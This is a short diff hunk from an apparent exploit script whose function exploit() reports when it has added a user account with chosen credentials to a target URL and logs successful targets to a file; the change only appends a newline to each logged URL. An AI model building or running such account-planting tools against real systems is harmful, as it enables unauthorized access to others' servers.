@@ -42,7 +42,7 @@ def exploit(url, username, password, domain):
             if check_response.ok and "1" in check_response.text:
                 print(f"[+] {url} Successfully added user. username: {GREEN}{username}{RESET} and password: {GREEN}{password}{RESET}")
                 with open("success.txt", "a+") as success_file:
-                    success_file.write(url)
+                    success_file.write(url + "\n")
                 success_file.close()
         except:
             pass
